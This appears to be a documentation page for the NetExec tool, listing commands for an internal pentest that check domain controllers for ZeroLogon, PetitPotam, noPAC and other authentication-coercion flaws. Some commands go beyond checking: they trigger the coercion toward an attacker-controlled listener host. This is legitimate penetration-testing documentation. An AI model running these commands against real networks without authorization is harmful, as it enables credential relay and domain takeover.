---
description: Check if a DC is vulnerable
---

# Scan for Vulnerabilities

When you start your internal pentest, these are the first modules you should try:

### ZeroLogon

`nxc smb <ip> -u '' -p '' -M zerologon`

### PetitPotam

`nxc smb <ip> -u '' -p '' -M petitpotam`

### noPAC

`nxc smb <ip> -u 'user' -p 'pass' -M nopac`

{% hint style="warning" %}
You need a credential for this one
{% endhint %}

Or, try them all at once! Just list each one: `-M zerologon -M petitpotam`

# Scan for Coerce Vulnerabilities

You can check coerce vulnerabilities like Petitpotam, DFSCoerce, PrinterBug, MSEven, ShadowCoerce with the coerce_plus module.

`nxc smb <ip> -u '' -p '' -M coerce_plus`

If you find a vulnerability, you can use the `coerce_plus` module to exploit it.

`nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>`

If you want use all exploit methods add `ALWAYS=true` option.

`nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true`

You can also use the `coerce_plus` module to check for one coerce method.

`nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam`

{% hint style="success" %}
Instead of the 'METHOD' option you can use 'M'. Also the short name 'L' instead of the 'LISTENER' argument.\n
This also applies to the names of vulnerabilities in the method.\n
-M=p // Invalid, as both petitpotam and printerbug start with ‘p’ so modules gives error\n
-M=pr // Matches printerbug\n
-M=pe // Matches petitpotam\n
-M=dfs // Matches dfscoerce\n
{% endhint %}

Check out what other modules are available via `nxc <protocol> -L`
